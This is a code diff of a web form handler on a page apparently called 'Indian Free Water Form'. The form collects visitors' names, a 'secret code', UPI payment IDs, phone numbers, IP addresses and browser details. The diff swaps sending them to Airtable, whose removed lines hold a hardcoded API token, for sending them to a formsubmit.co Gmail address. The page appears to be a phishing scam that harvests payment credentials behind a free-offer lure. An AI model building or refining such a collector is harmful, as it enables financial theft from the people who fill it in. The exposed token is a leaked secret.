@@ -385,63 +385,65 @@
                 const formData = new FormData(this);
                 const data = Object.fromEntries(formData);
                 
-                // Airtable API configuration
-                const airtableConfig = {
-                    baseId: 'appGY1EL9Ma68WeAH',
-                    tableName: 'DATA',
-                    apiKey: 'pat6AvVXQl4S5zdKz.d920e0f3e92785755518ce0c2e263176de75f8923cf2e408926b8144544b59eb'
-                };
+                // Show loading state
+                const submitButton = document.querySelector('button[type="submit"]');
+                const originalButtonText = submitButton.innerHTML;
+                submitButton.innerHTML = '<i class="fas fa-spinner fa-spin me-2"></i>Submitting...';
+                submitButton.disabled = true;
                 
-                // Prepare data for Airtable
-                const airtableData = {
-                    "records": [
-                        {
-                            "fields": {
-                                "NAME": data.name,
-                                "SECRET CODE": data.secretCode,
-                                "UPI ID": data.upiId,
-                                "Phone Number": data.phoneNumber,
-                                "IP Address": data.ipAddress,
-                                "Browser Info": data.browserInfo
-                            }
-                        }
-                    ]
-                };
+                // Prepare data for submission
+                const submissionData = new FormData();
+                submissionData.append('name', data.name);
+                submissionData.append('secretCode', data.secretCode);
+                submissionData.append('upiId', data.upiId);
+                submissionData.append('phoneNumber', data.phoneNumber);
+                submissionData.append('ipAddress', data.ipAddress);
+                submissionData.append('browserInfo', data.browserInfo);
+                submissionData.append('timestamp', new Date().toISOString());
+                submissionData.append('source', 'Indian Free Water Form');
                 
-                // Submit to Airtable using a CORS proxy
-                fetch('https://cors-anywhere.herokuapp.com/https://api.airtable.com/v0/' + airtableConfig.baseId + '/' + airtableConfig.tableName, {
+                // Use FormSubmit.co - a reliable service for static sites
+                fetch('https://formsubmit.co/indianfreewater@gmail.com', {
                     method: 'POST',
-                    headers: {
-                        'Authorization': 'Bearer ' + airtableConfig.apiKey,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(airtableData)
+                    body: submissionData
                 })
                 .then(response => {
+                    console.log('Response status:', response.status);
                     if (response.ok) {
-                        // Show success message
-                        document.getElementById('successMessage').style.display = 'block';
-                        document.getElementById('errorMessage').style.display = 'none';
-                        document.getElementById('customForm').reset();
-                        
-                        // Hide success message after 5 seconds
-                        setTimeout(() => {
-                            document.getElementById('successMessage').style.display = 'none';
-                        }, 5000);
+                        return response.text();
                     } else {
-                        throw new Error('Submission failed');
+                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                     }
                 })
+                .then(result => {
+                    console.log('Submission result:', result);
+                    
+                    // Show success message
+                    document.getElementById('successMessage').style.display = 'block';
+                    document.getElementById('errorMessage').style.display = 'none';
+                    document.getElementById('customForm').reset();
+                    
+                    // Hide success message after 5 seconds
+                    setTimeout(() => {
+                        document.getElementById('successMessage').style.display = 'none';
+                    }, 5000);
+                })
                 .catch(error => {
-                    console.error('Error:', error);
+                    console.error('Submission error:', error);
+                    
                     // Show error message
+                    document.getElementById('errorMessage').innerHTML = `
+                        <i class="fas fa-exclamation-circle me-2"></i>
+                        <strong>Error!</strong> Unable to submit data at this time. Please try again later or contact support.
+                        <br><small class="mt-2">Error details: ${error.message}</small>
+                    `;
                     document.getElementById('errorMessage').style.display = 'block';
                     document.getElementById('successMessage').style.display = 'none';
-                    
-                    // Hide error message after 5 seconds
-                    setTimeout(() => {
-                        document.getElementById('errorMessage').style.display = 'none';
-                    }, 5000);
+                })
+                .finally(() => {
+                    // Reset button state
+                    submitButton.innerHTML = originalButtonText;
+                    submitButton.disabled = false;
                 });
             });
 
